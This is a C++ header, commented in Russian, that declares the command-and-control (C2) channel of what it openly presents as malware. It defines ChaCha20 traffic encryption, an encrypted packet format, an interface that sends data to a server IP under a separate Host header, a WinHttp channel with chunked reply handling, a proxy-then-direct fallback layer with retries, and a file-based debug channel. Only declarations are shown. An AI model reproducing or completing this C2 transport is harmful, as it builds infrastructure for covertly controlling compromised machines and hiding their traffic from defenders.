#pragma once

#include "global.hpp"

extern "C"
{
#include "crypto\ecrypt-sync.h"
}

// канал связи с C2 сервером

// прототипы функций для шифрования-дешифрования трафика
// lpInputData - указатель на входящий буфер для шифрования/дешифрования
// dwInputSize - размер буфера
// lpOutputData - указатель принимающий адрес нововыделенного буфера с зашифрованными/расшифрованными данными
// lpdwOutputDataSize - указатель на переменную принимающую значение размера зашифрованного/расшифрованного буфера
typedef BOOL(WINAPI *fnEncryptTraffic)(LPBYTE lpInputData, SIZE_T dwInputSize, LPBYTE *lpOutputData, PSIZE_T lpdwOutputDataSize);
typedef BOOL(WINAPI *fnDecryptTraffic)(LPBYTE lpInputData, SIZE_T dwInputSize, LPBYTE *lpOutputData, PSIZE_T lpdwOutputDataSize);
typedef BOOL(WINAPI *fnGetVersionExW_winhttp)(LPOSVERSIONINFOW lpVersionInformation);


namespace netcrypto
{
#pragma pack(1)
	struct net_encrypted_packet
	{
		unsigned char IV[ECRYPT_MAXIVSIZE / 8];
		DWORD32 dwPayloadSize; // размер payload нужно задавать явно, так как при сбоях в сети возможно скачать какой-то мусор в завершении к данным
		unsigned char payload[]; // собственно зашифрованные данные
	};
#pragma pack()

	BOOL WINAPI EncryptChacha20(LPBYTE lpInputData, SIZE_T dwInputSize, LPBYTE *lpOutputData, PSIZE_T lpdwOutputDataSize);
	BOOL WINAPI DecryptChacha20(LPBYTE lpInputData, SIZE_T dwInputSize, LPBYTE *lpOutputData, PSIZE_T lpdwOutputDataSize);
}

class IControlServer
{
public:
	virtual ~IControlServer() = default;
	// инициализирует функциями для работы с шифрованием трафика, если передан nullptr, то трафик не шифруется
	// extraParameter зависит от конкретной имплементации
	// dwLimit - лимит на ответ от сервера, если превышает - send вернет ошибку
	virtual VOID init(fnEncryptTraffic _EncryptTraffic, fnDecryptTraffic _DecryptTraffic, DWORD dwLimit, blob *extraParameter) = 0;
	// отправляет данные lpData размером dwDataSize на lpIpAddress записывая в Host: pwDomain, указатель на буфер с ответом сохраняя в lpResponse и размер в pdwResponseSize
	// в случае если при инициализации были переданы указатели на _EncryptTraffic/_DecryptTraffic, то произведет шифровование отправляемых данных и декрипт ответа
	virtual BOOL send(PWCHAR lpIpAddress, PWCHAR pwDomain, LPBYTE lpData, SIZE_T dwDataSize, LPBYTE *lpResponse, PSIZE_T pdwResponseSize) = 0;
};

#ifndef _DEBUG_CHANNEL
struct WinHttpParameter
{
	DWORD dwAccessType;
};

// список chunked ответов, так как мы максимум по 8 килобайт получаем ответ в WinHttpReadData
// для производительности мы все сохраняем в список, который в последствии коллапсирует в единственный байт-массив
struct chunked_response_list
{
	blob data;
	chunked_response_list *next;
};

class WinHttpChannel : public IControlServer
{
public:
	WinHttpChannel();
	~WinHttpChannel();
	VOID init(fnEncryptTraffic _EncryptTraffic, fnDecryptTraffic _DecryptTraffic, DWORD dwLimit, blob *extraParameter);
	BOOL send(PWCHAR lpIpAddress, PWCHAR pwDomain, LPBYTE lpData, SIZE_T dwDataSize, LPBYTE *lpResponse, PSIZE_T pdwResponseSize);

private:
	fnEncryptTraffic pEncryptTraffic;
	fnDecryptTraffic pDecryptTraffic;
	WinHttpParameter *param;
	DWORD dwReplyLimit;

	DWORD dwSeed;

	HANDLE hHeap;

	BOOL sendRequest(HINTERNET hSession, HINTERNET *hConnect, HINTERNET *hRequest, PWCHAR lpIpAddress, PWCHAR pwDomain, LPBYTE lpData, SIZE_T dwDataSize);
	BOOL readResponse(HINTERNET hRequest, LPBYTE *lpResponse, PSIZE_T dwResponseSize);
	PWCHAR getObjectStr();

	LPBYTE reallocBytes(LPBYTE lpBuffer, SIZE_T dwNewSize, BOOL bPreserveBytes, DWORD dwOldSize);
	// аллоцирует элемент списка chunked_response_list
	// entry_ptr указатель на указатель входа в список, если указатель входа nullptr, то аллоцируется новый массив и его адрес сохраняется в оригинальный указатель
	// если он не nullptr, то ищется последний элемент и аллоцируется новый элемент после него
	// dwAllocSize - максимальный размер аллоцируемого буффера для данных внутри элемента
	// pdwSizeEntry_out - указатель на указатель который принимает адрес chunked_response_list::blob::dwBufSize для последующей перезаписи, если размер записанных данных был меньше чем аллоцированный
	// возвращает адрес на буффер для записи
	LPBYTE allocChunkedEntry(chunked_response_list **entry_ptr, SIZE_T dwAllocSize, PSIZE_T *pdwSizeEntry_out);
	VOID destroy_chunked_list(chunked_response_list *entry);
	// коллапсирует список chunked в единый байтмассив
	BOOL collapse_chunked_list(chunked_response_list *entry, blob *pblOutput);
	SIZE_T get_chunked_datasize(chunked_response_list *entry);
	chunked_response_list **get_lastaddr_tonext(chunked_response_list **entry_ptr);

#ifdef _DEBUG
	VOID savedebug(LPBYTE lpResponseBuffer, SIZE_T dwResponseSize, LPBYTE lpRequestBuffer, SIZE_T dwRequestSize);
#endif
};

// прокси-класс вызывающий WinHttpChanel с различными параметрами WinHttpOpen, сначала с прокси, потом без прокси
class WinHttpAbsLayer : public IControlServer
{
public:
	WinHttpAbsLayer();
	~WinHttpAbsLayer();

	VOID init(fnEncryptTraffic _EncryptTraffic, fnDecryptTraffic _DecryptTraffic, DWORD dwLimit, blob *extraParameter);
	BOOL send(PWCHAR lpIpAddress, PWCHAR pwDomain, LPBYTE lpData, SIZE_T dwDataSize, LPBYTE *lpResponse, PSIZE_T pdwResponseSize);

private:
	fnEncryptTraffic pEncryptTraffic;
	fnDecryptTraffic pDecryptTraffic;
	DWORD dwReplyLimit;
	DWORD dwTriesAmount;

	IControlServer *reallocServer(IControlServer* server);
	DWORD getCurrentProxyType();
};
#endif

#ifdef _DEBUG_CHANNEL
// двусторонний канал связи для дебага через файлы 
class DebugFileChannel : protected IControlServer
{
public:
	DebugFileChannel();
	~DebugFileChannel();
	VOID init(fnEncryptTraffic _EncryptTraffic, fnDecryptTraffic _DecryptTraffic, DWORD dwLimit, blob *extraParameter);
	BOOL send(PWCHAR lpIpAddress, PWCHAR pwDomain, LPBYTE lpData, SIZE_T dwDataSize, LPBYTE *lpResponse, PSIZE_T pdwResponseSize);
private:
	fnEncryptTraffic pEncryptTraffic;
	fnDecryptTraffic pDecryptTraffic;

	HANDLE hStdInput;
	HANDLE hStdOutput;

	BOOL PrintData(PWCHAR pwData, SIZE_T dwDataSize);
	BOOL ReadData(PWCHAR *pwData, PSIZE_T pdwDataSize);

	BOOL ReadFromFile(PWCHAR pwFile, LPBYTE *lpOutput, SIZE_T *dwOutputSize);
	BOOL Dump2File(PWCHAR wchName, LPBYTE lpData, SIZE_T dwSize);

	HANDLE hMutex;
	BOOL bRootChannel; // первый основной созданный DebugFileChannel

	WCHAR wchNameInput[256];
	WCHAR wchNameOutput[256];
};
#endif